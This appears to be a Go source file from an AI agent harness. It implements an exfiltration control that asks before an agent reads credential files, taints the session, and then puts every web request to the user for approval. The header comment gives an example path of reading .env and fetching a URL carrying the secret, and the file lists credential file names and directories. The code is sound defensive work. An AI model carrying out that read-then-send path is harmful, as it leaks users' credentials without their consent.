package harness

import (
	"encoding/json"
	"path"
	"path/filepath"
	"strings"
	"sync"
)

// Exfiltration control (I10). The model reads files, and in agent, edit, and
// full mode it can also reach the web. Reading .env and then fetching
// https://x/?k=<secret> would send a credential out with nobody asked. The
// monitor closes that path in two steps:
//
//   - reading a well-known secret file always asks, in every mode, and a run
//     that cannot ask is refused; search_files never scans those files;
//   - once one has been read, the session is tainted, and every web request
//     asks, in every mode, showing the full URL or query, for as long as the
//     secret can still be in the conversation.
//
// This governs the model's file and web tools. A shell the user has allowed
// can read and send anything; containing that is the sandbox's job.

// SessionTaint records the secret files a conversation has read. It is shared
// by a run and its child agents, and in the TUI by every turn of a session,
// because file contents stay in the transcript. A nil *SessionTaint is clean.
type SessionTaint struct {
	mu      sync.Mutex
	sources []string
}

func NewSessionTaint() *SessionTaint { return &SessionTaint{} }

// Mark records that source's contents entered the conversation.
func (t *SessionTaint) Mark(source string) {
	if t == nil {
		return
	}
	t.mu.Lock()
	defer t.mu.Unlock()
	for _, s := range t.sources {
		if s == source {
			return
		}
	}
	t.sources = append(t.sources, source)
}

// Sources lists what tainted the session; empty means clean.
func (t *SessionTaint) Sources() []string {
	if t == nil {
		return nil
	}
	t.mu.Lock()
	defer t.mu.Unlock()
	return append([]string{}, t.sources...)
}

// restoredTaint treats pre-metadata transcripts conservatively: compaction may
// have removed the original read_file call while retaining its secret contents.
func (s *InteractiveSession) restoredTaint() *SessionTaint {
	taint := NewSessionTaint()
	for _, source := range s.SecretSources {
		taint.Mark(source)
	}
	if s.SecretSources == nil && len(s.Messages) > 0 {
		taint.Mark("a saved conversation with unknown secret-read history")
	}
	return taint
}

// secretNames are files that hold credentials by convention, matched on the
// base name, case-insensitively.
var secretNames = map[string]bool{
	".env": true, ".npmrc": true, ".pypirc": true, ".netrc": true, "_netrc": true,
	".git-credentials": true, ".htpasswd": true, ".pgpass": true,
	"id_rsa": true, "id_dsa": true, "id_ecdsa": true, "id_ed25519": true,
	"credentials.json": true, "service-account.json": true,
}

// secretExtensions are key and keystore formats.
var secretExtensions = map[string]bool{
	".pem": true, ".key": true, ".p12": true, ".pfx": true, ".jks": true, ".keystore": true,
}

// secretDirs hold credentials whatever the file is called.
var secretDirs = [][]string{{".ssh"}, {".aws"}, {".gnupg"}, {".docker"}, {".kube"}}

// readsSecret reports whether a read_file argument resolves to a secret file,
// judging the canonical path so a symlink named config.txt cannot hide .env.
func readsSecret(req RunRequest, tool, args string) (string, bool) {
	if tool != "read_file" {
		return "", false
	}
	var parsed struct {
		Path string `json:"path"`
	}
	if json.Unmarshal([]byte(args), &parsed) != nil || strings.TrimSpace(parsed.Path) == "" {
		return "", false
	}
	target := parsed.Path
	if !filepath.IsAbs(target) {
		target = filepath.Join(req.WorkingDir, target)
	}
	rel := strings.Join(relativeParts(canonicalPath(req.WorkingDir), canonicalPath(filepath.Clean(target))), "/")
	return parsed.Path, isSecretPath(rel) || isSecretPath(parsed.Path)
}

// isSecretPath reports whether a workspace path names a credentials file.
// .env templates (.env.example, .env.sample, .env.template) are documentation.
func isSecretPath(p string) bool {
	parts := strings.Split(filepath.ToSlash(path.Clean(filepath.ToSlash(p))), "/")
	for _, dir := range secretDirs {
		if containsSequence(parts, dir) {
			return true
		}
	}
	base := strings.ToLower(parts[len(parts)-1])
	if secretNames[base] {
		return true
	}
	if strings.HasPrefix(base, ".env.") {
		switch strings.TrimPrefix(base, ".env.") {
		case "example", "sample", "template", "dist", "defaults":
			return false
		}
		return true
	}
	return secretExtensions[path.Ext(base)]
}
